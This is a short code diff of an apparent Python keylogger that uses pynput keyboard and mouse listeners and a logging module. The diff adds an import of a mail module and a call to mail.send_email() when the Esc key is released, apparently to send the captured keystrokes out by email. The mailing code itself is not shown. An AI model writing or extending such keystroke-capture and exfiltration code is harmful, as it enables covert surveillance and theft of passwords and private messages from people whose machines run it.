@@ -1,5 +1,6 @@
 from pynput import keyboard, mouse
 from logs import logs
+from mails import mail
 
 def on_press(key):
     try:
@@ -10,6 +11,7 @@ def on_press(key):
 
 def on_release(key):
     if key == keyboard.Key.esc:
+        mail.send_email()
         # Stop Listener
         return False
     
